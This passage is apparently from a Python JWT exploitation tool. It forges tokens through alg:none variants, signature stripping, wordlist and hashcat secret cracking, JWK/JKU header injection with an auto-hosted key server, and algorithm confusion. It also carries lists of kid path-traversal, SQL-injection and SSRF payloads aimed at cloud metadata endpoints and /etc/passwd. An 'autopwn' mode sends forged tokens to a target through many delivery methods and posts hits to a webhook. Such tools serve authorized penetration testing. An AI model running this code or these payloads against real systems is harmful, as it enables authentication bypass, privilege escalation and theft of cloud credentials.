    print(Fore.YELLOW + "[*] Decoded Header:")
    print(Fore.YELLOW + json.dumps(header, indent=4))
    print(Fore.YELLOW + "[*] Modified Payload:")
    print(Fore.YELLOW + json.dumps(payload, indent=4))

    # Record every generated token for reporting
    CONFIG["findings"].append({
        "attack":    attack_name,
        "token":     token,
        "payload":   payload,
        "header":    header,
        "verified":  False,
        "verify_reason": None,
        "delivery":  None,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    })


def _is_graphql_url(url):
    """Heuristic: return True if URL likely points to a GraphQL endpoint."""
    if not url:
        return False
    url_lower = url.lower()
    return any(hint in url_lower for hint in ("/graphql", "/gql", "/api/graphql", "/v1/graphql", "/query"))


def check_url(token, url=None):
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url specified — skipping HTTP check for this token.")
            return
        print()
        url = input(Fore.YELLOW + "Enter URL endpoint to check if token works: ").strip()
        if not url:
            print(Fore.RED + "No URL provided. Skipping check.")
            return

    # HTTP method selection — autopwn defaults to GET silently
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    if CONFIG.get("autopwn"):
        method = "GET"
    else:
        print(Fore.YELLOW + "\nSelect HTTP method:")
        for i, m in enumerate(methods, start=1):
            default_note = " (default)" if i == 1 else ""
            print(f"[{i}] {m}{default_note}")
        choice = input(Fore.CYAN + "Enter choice [1-5]: ").strip()
        if not choice:
            method = "GET"
        else:
            try:
                idx = int(choice)
                method = methods[idx - 1] if 1 <= idx <= len(methods) else "GET"
            except ValueError:
                method = "GET"
    print(Fore.MAGENTA + f"\n[>] Using HTTP Method: {method}")

    # Build session — respects --proxy, --no-ssl-verify, --timeout
    session = requests.Session()
    if CONFIG["proxy"]:
        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
        print(Fore.YELLOW + f"[*] Routing via proxy: {CONFIG['proxy']}")
    session.verify = CONFIG["ssl_verify"]
    timeout = CONFIG["timeout"]

    # Smart baseline: send original token first so we can diff the forged response
    baseline_status = None
    baseline_body   = None
    orig = CONFIG.get("original_token")
    if orig and orig != token:
        try:
            b = session.request(
                method, url,
                headers={"Authorization": f"Bearer {orig}"},
                timeout=timeout
            )
            baseline_status = b.status_code
            baseline_body   = b.text
            print(Fore.CYAN + f"[BASELINE] Original token → HTTP {baseline_status} ({len(baseline_body)} bytes)")
        except Exception:
            pass

    # Keywords that indicate a privilege escalation in the response body
    PRIVILEGE_KW = [
        '"role":"admin"',   '"role": "admin"',
        '"isadmin":true',   '"isadmin": true',
        '"admin":true',     '"admin": true',
        '"elevated":true',  '"elevated": true',
        '"is_admin":true',  '"is_admin": true',
        '"superuser":true', '"superuser": true',
        'administrator',    'superadmin',
    ]

    def is_success(resp):
        """Compare forged response against baseline (if available) or use heuristics."""
        body_lower = resp.text.lower()
        if baseline_status is not None:
            # Status code changed → likely auth bypass
            if resp.status_code != baseline_status:
                return True, f"Status code changed: {baseline_status} → {resp.status_code}"
            # Body length changed by >15% → different data returned
            if baseline_body is not None:
                bl = len(baseline_body)
                if bl > 0 and abs(len(resp.text) - bl) / bl > 0.15:
                    return True, f"Response body size changed ({bl} → {len(resp.text)} bytes)"
            # New privilege keywords appeared that weren't in the baseline response
            bl_lower = baseline_body.lower() if baseline_body else ""
            for kw in PRIVILEGE_KW:
                if kw in body_lower and kw not in bl_lower:
                    return True, f"New privilege keyword detected: '{kw}'"
            return False, None
        else:
            # No baseline — fall back to HTTP 200 + keyword heuristic
            if resp.status_code == 200:
                for kw in PRIVILEGE_KW:
                    if kw in body_lower:
                        return True, f"HTTP 200 + privilege keyword: '{kw}'"
                return True, "HTTP 200 (run with --url on original token for smarter baseline detection)"
            return False, None

    # Delivery attempt 1: Authorization: Bearer <token>
    print(Fore.CYAN + f"[+] Testing  Authorization: Bearer  ({method})...")
    _rate_sleep()
    try:
        resp = session.request(method, url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
        ok, reason = is_success(resp)
        if ok:
            delivery = "Authorization: Bearer"
            print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED!  Reason: {reason}")
            print_response_details(resp)
            curl = _poc_curl(token, delivery, url, method)
            print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
            if CONFIG["quiet"]:
                print(f"FOUND: {delivery} | {reason} | {url}")
            if CONFIG["findings"]:
                CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
                                               "delivery": delivery, "poc_curl": curl})
                _notify_webhook(CONFIG["findings"][-1])
            return
    except Exception as e:
        print(Fore.RED + f"[!] Request error (Bearer header): {e}")

    # Delivery attempt 2: Cookie variants
    for cookie_name in ["session", "jwt", "auth", "token"]:
        print(Fore.CYAN + f"[+] Testing  cookie '{cookie_name}'  ({method})...")
        _rate_sleep()
        try:
            resp = session.request(method, url, cookies={cookie_name: token}, timeout=timeout)
            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
            ok, reason = is_success(resp)
            if ok:
                delivery = f"Cookie: {cookie_name}"
                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via cookie '{cookie_name}'!  Reason: {reason}")
                print_response_details(resp)
                curl = _poc_curl(token, delivery, url, method)
                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
                if CONFIG["quiet"]:
                    print(f"FOUND: {delivery} | {reason} | {url}")
                if CONFIG["findings"]:
                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
                                                   "delivery": delivery, "poc_curl": curl})
                    _notify_webhook(CONFIG["findings"][-1])
                return
        except Exception as e:
            print(Fore.RED + f"[!] Request error (cookie '{cookie_name}'): {e}")

    # Delivery attempt 3: custom header variants (frameworks, API gateways, proxies)
    HEADER_VARIANTS = [
        ("Authorization",   f"JWT {token}"),
        ("Authorization",   f"Token {token}"),
        ("X-Auth-Token",    token),
        ("X-Access-Token",  token),
        ("X-JWT-Assertion", token),
        ("X-Token",         token),
        ("x-api-key",       token),
        ("Api-Key",         token),
    ]
    for hdr_name, hdr_value in HEADER_VARIANTS:
        print(Fore.CYAN + f"[+] Testing  {hdr_name}  ({method})...")
        _rate_sleep()
        try:
            resp = session.request(method, url, headers={hdr_name: hdr_value}, timeout=timeout)
            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
            ok, reason = is_success(resp)
            if ok:
                delivery = f"{hdr_name}"
                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via '{hdr_name}'!  Reason: {reason}")
                print_response_details(resp)
                curl = _poc_curl(token, delivery, url, method)
                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
                if CONFIG["quiet"]:
                    print(f"FOUND: {delivery} | {reason} | {url}")
                if CONFIG["findings"]:
                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
                                                   "delivery": delivery, "poc_curl": curl})
                    _notify_webhook(CONFIG["findings"][-1])
                return
        except Exception as e:
            print(Fore.RED + f"[!] Request error ('{hdr_name}'): {e}")

    print(Fore.RED + "\n[!] Token not accepted via any tested delivery method.")

    # Delivery attempt 4: GraphQL — if endpoint looks like GraphQL, try JWT in query variable
    if _is_graphql_url(url):
        print(Fore.CYAN + "\n[+] GraphQL endpoint detected — trying JWT in query variable...")
        _rate_sleep()
        try:
            gql_payload = {"query": "{ __typename }", "variables": {"token": token}}
            resp = session.post(url,
                                json=gql_payload,
                                headers={"Authorization": f"Bearer {token}",
                                         "Content-Type": "application/json"},
                                timeout=timeout)
            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
            ok, reason = is_success(resp)
            if ok:
                delivery = "GraphQL: Authorization Bearer + query variable"
                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via GraphQL!  Reason: {reason}")
                print_response_details(resp)
                curl = (f'curl -s -X POST "{url}" '
                        f'-H "Authorization: Bearer {token}" '
                        f'-H "Content-Type: application/json" '
                        f'-d \'{{"query":"{{__typename}}","variables":{{"token":"{token}"}}}}\'')
                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
                if CONFIG["quiet"]:
                    print(f"FOUND: {delivery} | {reason} | {url}")
                if CONFIG["findings"]:
                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
                                                   "delivery": delivery, "poc_curl": curl})
                    _notify_webhook(CONFIG["findings"][-1])
                return
        except Exception as e:
            print(Fore.RED + f"[!] Request error (GraphQL): {e}")

    print(Fore.RED + "\n[!] Token not accepted via any delivery method.")


def print_response_details(response):
    print(Fore.CYAN + "[*] Response Headers:")
    for k, v in response.headers.items():
        print(Fore.GREEN +f"{k}: {v}")

    # Response cookies if any
    if response.cookies:
        print(Fore.CYAN + "[*] Response Cookies:")
        for cookie in response.cookies:
            print(f"{cookie.name}: {cookie.value}")

    print(Fore.CYAN + "[*] Response Body (first 500 chars):")
    text = response.text
    print(text[:1000] + ("..." if len(text) > 1000 else ""))

def generate_rsa_keypair():
    print(Fore.CYAN + "[*] Generating new RSA keypair...")

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    with open("private_key.pem", "wb") as f:
        f.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    with open("public_key.pem", "wb") as f:
        f.write(
            private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

    print(Fore.GREEN + "[+] Keys generated: 'private_key.pem' & 'public_key.pem'")
    return private_key

def manual_hs256_sign(header, payload, secret):
    """
    Manually sign a JWT with HS256 to bypass library restrictions (e.g. PyJWT blocking public keys as secrets).
    """
    import hmac
    import hashlib

    # Ensure alg is HS256 in header
    header["alg"] = "HS256"
    
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b'=').decode()
    
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    # Handle secret: if it's a file path (like a PEM key), read bytes. If it's a string, use bytes.
    if isinstance(secret, str):
        if os.path.isfile(secret):
            with open(secret, "rb") as f:
                secret_bytes = f.read()
        else:
            secret_bytes = secret.encode()
    else:
        secret_bytes = secret

    signature = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def attack_null_signature(token, url=None):
    """
    Removes the signature but keeps the structure (header.payload.).
    Some libraries fail to check the signature if it's missing entirely.
    """
    decoded = decode_token(token)
    header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    
    # Re-encode without signing
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()
    
    modified_token = f"{header_b64}.{payload_b64}."
    
    print_result("Null Signature (Signature Stripping)", modified_token, modified_payload, header)
    check_url(modified_token, url)

def attack_unverified_signature(token, url=None):
    header_b64, payload_b64, signature = token.split('.')
    decoded_payload = json.loads(base64.urlsafe_b64decode(pad_b64(payload_b64)))
    decoded_header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    modified_header = interactive_edit_dict("Token header", decoded_header)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded_payload)

    # Re-encode payload
    modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()
    modified_header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
    modified_token = f"{modified_header_b64}.{modified_payload_b64}.{signature}"

    print_result("Unverified Signature", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

def attack_flawed_verification(token, url=None):
    decoded = decode_token(token)
    header  = dict(get_header(token))

    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    # Try all 7 case variations — some parsers accept non-lowercase "none"
    none_variants = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "nonE"]
    print(Fore.CYAN + f"\n[*] Testing {len(none_variants)} alg:none case variations...")

    for variant in none_variants:
        h = dict(header)
        h["alg"] = variant
        forged = manual_none_token(h, modified_payload)
        print_result(f"alg:{variant} Bypass", forged, modified_payload, h)
        check_url(forged, url)
        if CONFIG.get("autopwn"):
            continue
        ans = input(Fore.CYAN + "[?] Continue to next variant? [Y/n]: ").strip().lower()
        if ans == "n":
            break


def attack_weak_signing_key(token, wordlist, url=None):
    header = get_header(token)
    algorithm = header.get("alg", "HS256")
    print(Fore.CYAN + f"[*] Algorithm: {algorithm}")

    # Prompt for wordlist if not valid path
    while not wordlist or not os.path.isfile(os.path.expanduser(wordlist)):
        wordlist = input(Fore.YELLOW + "Enter path to wordlist file: ").strip()
        if not wordlist:
            print(Fore.RED + "[-] No wordlist path provided. Exiting.")
            return
        if not os.path.isfile(os.path.expanduser(wordlist)):
            print(Fore.RED + f"[-] File not found: {wordlist}")

    wordlist = os.path.expanduser(wordlist)

    # ── hashcat (GPU) path ──────────────────────────────────────
    if CONFIG.get("use_hashcat"):
        print(Fore.CYAN + "[*] 🎮 Using hashcat (GPU mode) for cracking...")
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
            tf.write(token + "\n")
            token_file = tf.name
        try:
            result = subprocess.run(
                ["hashcat", "-a", "0", "-m", "16500", "--quiet", token_file, wordlist],
                capture_output=True, text=True, timeout=3600
            )
            output = result.stdout + result.stderr
            cracked = None
            for line in output.splitlines():
                # hashcat format for mode 16500: <token>:<secret>
                if line.count(".") >= 2 and ":" in line:
                    cracked = line.split(":")[-1].strip()
                    break
            if cracked:
                print(Fore.GREEN + f"[+] hashcat cracked secret: {cracked}")
                _use_cracked_secret(token, cracked, algorithm, header, url)
            else:
                print(Fore.RED + "[-] hashcat did not crack the secret.")
                if result.returncode not in (0, 1):
                    print(Fore.RED + f"[!] hashcat stderr: {result.stderr[:300]}")
        except FileNotFoundError:
            print(Fore.RED + "[!] hashcat not found in PATH — falling back to Python threaded mode")
            CONFIG["use_hashcat"] = False  # retry below
        finally:
            try:
                os.unlink(token_file)
            except OSError:
                pass
        if CONFIG.get("use_hashcat"):
            return  # hashcat ran (hit or miss) — done

    # ── Python threaded brute force ─────────────────────────────
    print(Fore.CYAN + "[*] ⚡ Threaded brute force (50 workers) starting...")
    found_event  = threading.Event()
    found_result = [None]
    lock         = threading.Lock()

    def try_secret(secret):
        if found_event.is_set():
            return None
        try:
            jwt.decode(token, secret, algorithms=[algorithm],
                       options={"verify_exp": False})
            with lock:
                if not found_event.is_set():
                    found_event.set()
                    found_result[0] = secret
            return secret
        except (jwt.InvalidSignatureError, jwt.DecodeError):
            return None
        except Exception:
            return None

    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        secrets = [ln.strip() for ln in f if ln.strip()]

    print(Fore.CYAN + f"[*] Loaded {len(secrets):,} candidates from wordlist")

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(try_secret, s): s for s in secrets}
        checked = 0
        for future in as_completed(futures):
            checked += 1
            if found_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            if checked % 5000 == 0:
                print(Fore.CYAN + f"[*] Checked {checked:,}/{len(secrets):,}...", end="\r")

    if found_result[0]:
        secret = found_result[0]
        print(Fore.GREEN + f"\n[+] ✅ Secret cracked: {secret}")
        _use_cracked_secret(token, secret, algorithm, header, url)
    else:
        print(Fore.RED + f"\n[-] No secret found in {len(secrets):,} candidates.")


def _use_cracked_secret(token, secret, algorithm, header, url):
    """Edit payload and re-sign once a secret is cracked."""
    try:
        decoded = jwt.decode(token, secret, algorithms=[algorithm],
                             options={"verify_exp": False})
    except Exception:
        decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    modified_token   = jwt.encode(modified_payload, secret, algorithm=algorithm)
    print_result("Weak Signing Key (Cracked)", modified_token, modified_payload, header)
    check_url(modified_token, url)

def attack_jwk_header_injection(token, url=None):
    private_key = generate_rsa_keypair()
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    header = get_header(token)
    modified_header = interactive_edit_dict("Token header", header)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    pub = private_key.public_key().public_numbers()
    jwk = {
        "kty": "RSA",
        "kid": modified_header.get("kid", "custom"),
        "e": base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length()+7)//8, 'big')).rstrip(b'=').decode(),
        "n": base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length()+7)//8, 'big')).rstrip(b'=').decode()
    }
    modified_header["jwk"] = jwk
    modified_header["alg"] = "RS256"

    modified_token = jwt.encode(modified_payload, private_key, algorithm='RS256', headers=modified_header)
    print_result("JWK Header Injection", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

def attack_jku_header_injection(token, url=None):
    private_key     = generate_rsa_keypair()
    decoded_payload = decode_token(token)
    decoded_header  = get_header(token)

    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    modified_header = interactive_edit_dict("Token header", decoded_header)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded_payload)

    pub = private_key.public_key().public_numbers()
    e   = base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
    n   = base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

    kid  = modified_header.get("kid", "custom_kid")
    jwk  = {"kty": "RSA", "e": e, "n": n, "kid": kid}
    jwks = {"keys": [jwk]}

    # ── Auto-host the JWKS (no external service needed) ──────────
    jku_url = None
    server  = None
    port    = find_free_port(8888)

    if CONFIG.get("autopwn"):
        # Autopwn: silently start server, use LAN IP
        try:
            server  = start_jwks_server(jwks, port=port)
            jku_url = f"http://{get_lan_ip()}:{port}/.well-known/jwks.json"
            print(Fore.GREEN + f"[AUTOPWN] 🌐 JWKS server auto-started: {jku_url}")
        except Exception as ex:
            print(Fore.YELLOW + f"[AUTOPWN] Could not start JWKS server: {ex} — skipping JKU")
            return
    else:
        try:
            server   = start_jwks_server(jwks, port=port)
            lan_ip   = get_lan_ip()
            auto_url = f"http://{lan_ip}:{port}/.well-known/jwks.json"
            print(Fore.GREEN + f"\n[+] 🌐 JWKS server started automatically!")
            print(Fore.GREEN + f"[+] Serving at: {auto_url}")
            print(Fore.CYAN  + "[*] The target server must be able to reach your machine at this IP.")
            use_auto = input(Fore.CYAN + "[?] Use this auto-hosted URL? [Y/n]: ").strip().lower()
            if use_auto == "n":
                server.shutdown()
                server = None
                print(Fore.YELLOW + "[*] JWKS content to host manually:")
                print(Fore.YELLOW + json.dumps(jwks, indent=4))
                input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
                jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()
            else:
                jku_url = auto_url
        except Exception as ex:
            print(Fore.YELLOW + f"[!] Could not auto-host JWKS server: {ex}")
            print(Fore.YELLOW + "[*] JWKS content to host manually:")
            print(Fore.YELLOW + json.dumps(jwks, indent=4))
            input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
            jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()

    modified_header["jku"] = jku_url
    modified_header["kid"] = kid
    modified_header["alg"] = "RS256"

    modified_token = jwt.encode(modified_payload, private_key, algorithm='RS256', headers=modified_header)
    print_result("JKU Header Injection (auto-hosted JWKS)", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

    if server and not CONFIG.get("autopwn"):
        input(Fore.CYAN + "\n[?] Press Enter to shut down the JWKS server...")
        server.shutdown()
        print(Fore.YELLOW + "[*] JWKS server stopped.")

def attack_kid_traversal(token, url=None):
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    devnull_paths = [
        # ── Linux / macOS ─────────────────────────────────────────
        "/dev/null",
        "../dev/null",
        "../../dev/null",
        "../../../dev/null",
        "../../../../dev/null",
        "file:///dev/null",
        "../////dev/null",
        "%2e%2e/%2e%2e/%2e%2e/dev/null",
        "dev/null",
        "./../../../dev/null",
        # ── Windows — forward-slash variants ──────────────────────
        "C:/Windows/win.ini",
        "../../../Windows/win.ini",
        "../../../../Windows/win.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/boot.ini",
        # ── Windows — backslash variants ──────────────────────────
        "C:\\Windows\\win.ini",
        "..\\..\\..\\Windows\\win.ini",
        "..\\..\\..\\..\\Windows\\win.ini",
        "C:\\inetpub\\wwwroot\\web.config",
        # ── Windows — URL-encoded variants ────────────────────────
        "C%3A%5CWindows%5Cwin.ini",
        "..%5C..%5C..%5CWindows%5Cwin.ini",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
    ]

    for kid in devnull_paths:
        try:
            header = {"kid": kid, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, '', algorithm='HS256', headers=header)
            print_result(f"KID Path Traversal Attempt → {kid}", forged_token, modified_payload, header)
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with KID path '{kid}': {str(e)}")


def attack_kid_sqli(token, url=None):
    """
    KID SQL Injection — inject SQL payloads into the kid header.
    When the server uses kid to query a DB for the signing key, UNION SELECT
    lets the attacker control the returned key value, making signature forgery trivial.
    """
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    # (kid_payload, secret_used_to_sign)
    # The secret must match what the SQL injection makes the DB return
    sqli_payloads = [
        ("' UNION SELECT 'secret'-- -",               "secret"),
        ("' UNION SELECT 'hacked'-- -",               "hacked"),
        ("\" UNION SELECT 'secret'-- -",              "secret"),
        ("' UNION SELECT 'secret' FROM dual-- -",     "secret"),
        ("1 UNION SELECT 'secret'-- -",               "secret"),
        ("' OR '1'='1",                               ""),
        ("' OR 1=1-- -",                              ""),
        ("admin'-- -",                                ""),
        ("' UNION SELECT NULL-- -",                   ""),
        ("'; SELECT 'secret'-- -",                    "secret"),
    ]

    print(Fore.CYAN + f"\n[*] Testing {len(sqli_payloads)} KID SQL Injection payloads...")
    for kid_val, secret in sqli_payloads:
        try:
            hdr          = {"kid": kid_val, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, secret, algorithm='HS256', headers=hdr)
            print_result(
                f"KID SQLi  kid={kid_val!r}  secret={secret!r}",
                forged_token, modified_payload, hdr
            )
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with SQLi payload '{kid_val}': {e}")


def attack_kid_ssrf(token, url=None):
    """
    KID SSRF — set kid to internal/metadata URLs.
    When the server fetches the key from the kid URL it makes an outbound request,
    which can be redirected to internal services (AWS metadata, Redis, etc.).
    """
    decoded = decode_token(token)
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",                           # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IAM role
        "http://metadata.google.internal/computeMetadata/v1/",                # GCP metadata
        "http://100.100.100.200/latest/meta-data/",                           # Alibaba Cloud
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",    # Azure IMDS
        "http://127.0.0.1:80/",
        "http://localhost:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:6379/",                                             # Redis
        "http://127.0.0.1:9200/",                                             # Elasticsearch
        "http://127.0.0.1:5984/",                                             # CouchDB
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/info",                                         # Redis via DICT
    ]

    print(Fore.CYAN + f"\n[*] Testing {len(ssrf_payloads)} KID SSRF payloads...")
    for ssrf_kid in ssrf_payloads:
        try:
            hdr          = {"kid": ssrf_kid, "alg": "HS256"}
            forged_token = jwt.encode(modified_payload, '', algorithm='HS256', headers=hdr)
            print_result(f"KID SSRF → {ssrf_kid}", forged_token, modified_payload, hdr)
            check_url(forged_token, url)
        except Exception as e:
            print(Fore.RED + f"[!] Error with SSRF payload '{ssrf_kid}': {e}")


def jwt_algorithm_confusion_attack(token, url=None):
    
    key_path = None

    print(Fore.YELLOW + "\n[!] JWT Algorithm Confusion Attack Selected")
    print(Fore.CYAN + "Choose the method of confusion:")
    print("  1. Known Public Key")
    print("  2. Without Known Key (Signature Forgery via sig2n)")
    print("  3. Path Traversal for Public Key")

    choice = input(Fore.YELLOW + "Enter your choice : ").strip()

    if choice == "1":
        print("\n[*] You selected: Known Public Key")
        key_path = input(Fore.YELLOW + "Enter the path to the PEM public key file (e.g. key.pem) [Press Enter or 0 to skip]: ").strip()
        
        if key_path == "" or key_path == "0":
            print("[*] Skipping Known Public Key method.\n")
            return
        
        if not os.path.isfile(key_path):
            print(f"[!] File not found: {key_path}")
            return

    elif choice == "2":
        print("\n[*] You selected: Without Known Key (Signature Forgery)")
        print(Fore.CYAN + "[*] Please log out and log back in to the server to receive a new JWT token.")
        print()
        token2 = input(Fore.YELLOW + "Enter the second JWT token you received from the server: ").strip()

        # Run sig2n with both tokens
        try:
            sig2n_cmd = ["docker", "run", "--rm", "-it", "portswigger/sig2n", token, token2]
            print()
            print(Fore.CYAN + "[*] Running sig2n to analyze and forge signature...\n")
            result = subprocess.run(sig2n_cmd, capture_output=True, text=True)

            # Parse keys and JWTs from output
            keys = []
            lines = result.stdout.splitlines()
            current = {}

            for line in lines:
                line = line.strip()
                if line.startswith("Base64 encoded"):
                    if current:
                        keys.append(current)
                        current = {}
                    key_type = "x509" if "x509" in line else "pkcs1"
                    current["type"] = key_type
                    current["key"] = line.split(":", 1)[1].strip()
                elif line.startswith("Tampered JWT:"):
                    current["jwt"] = line.split(":", 1)[1].strip()

            if current:
                keys.append(current)

            if not keys:
                print(Fore.RED + "[-] No keys found in sig2n output.")
                return

            # Print keys with numbers
            print(Fore.GREEN + "\n[+] Extracted Keys and Tampered Tokens:\n")
            for i, k in enumerate(keys, 1):
                print(Fore.YELLOW + f"[{i}] {k['type']} key:")
                print(f"    Base64 encoded {k['type']} key: " + Fore.CYAN + f"{k['key']}")
                print(f"    Tampered JWT: " + Fore.YELLOW + f"{k['jwt']}\n")

            # Manual testing
            print(Fore.CYAN + "[*] Now manually test the tampered token using cookie change in Burp or browser.")

            # Prompt for key number
            selected_index = input(Fore.YELLOW + "[?] Enter the key number to use from the above output (e.g., 1, 2): ").strip()

            try:
                selected_index = int(selected_index) - 1
                if 0 <= selected_index < len(keys):
                    selected_b64_key = keys[selected_index]["key"]

                    # Decode base64 and write as PEM
                    decoded_key = base64.b64decode(selected_b64_key.encode())
                    key_path = "key.pem"

                    with open(key_path, "wb") as f:
                        f.write(decoded_key)

                    print(Fore.GREEN + f"[+] Key written to {key_path}")
                else:
                    print(Fore.RED + "[!] Invalid number entered.")
                    return

            except ValueError:
                print(Fore.RED + "[!] Invalid input. Please enter a number.")
                return

            if result.stderr:
                print(Fore.RED + "[-] sig2n Error Output:\n" + result.stderr)

        except Exception as e:
            print()
            print(Fore.RED + f"[!] Error running sig2n: {e}")
            return


    elif choice == "3":
        print(Fore.CYAN + "\n[*] You selected: Path Traversal for Public Key")

        base_url = input(Fore.YELLOW + "Enter the base URL: ").strip().rstrip('/')

        common_paths = [
            ".well-known/jwks.json",
            "jwks.json",
            "key.pem",
            "public.pem",
            "keys/public.pem",
            "static/key.pem",
            "static/public.pem",
            "cert.pem",
            "certs.pem",
            "certs/public.pem",
            ".well-known/openid-configuration"
        ]

        found_key = None

        print(Fore.CYAN + "\n[*] Trying common public key locations...")

        for path in common_paths:
            try:
                full_url = f"{base_url}/{path}"
                print(Fore.YELLOW + f"  [>] Trying: {full_url}")
                response = requests.get(full_url, timeout=5)

                if response.status_code == 200:
                    content = response.text.strip()

                    # Check if PEM format
                    if "BEGIN PUBLIC KEY" in content:
                        found_key = content
                        print(Fore.GREEN + f"  [+] Found PEM public key at {full_url}")
                        print()
                        print(Fore.CYAN + f"Public Key :\n {found_key}")
                        break
                    elif "keys" in content and "kty" in content:  # Possible JWKS
                        print(Fore.GREEN + f"  [+] Found JWKS at {full_url}")
                        jwks = response.json()
                        if "keys" in jwks and len(jwks["keys"]) > 0:

                            key_data = jwks["keys"][0]
                            print()
                            print(Fore.CYAN + f"Public Key : \n{jwks}")
                            e = int.from_bytes(base64.urlsafe_b64decode(key_data["e"] + '=='), 'big')
                            n = int.from_bytes(base64.urlsafe_b64decode(key_data["n"] + '=='), 'big')

                            pub = RSAPublicNumbers(e, n).public_key(default_backend())
                            found_key = pub.public_bytes(
                                serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo
                            ).decode()
                            break

                else:
                    print(Fore.RED + f"  [-] Not found: {full_url}")
            except Exception as e:
                print(Fore.RED + f"  [!] Error accessing {path}: {e}")

        if found_key:
            key_path = "key.pem"
            with open(key_path, "w") as f:
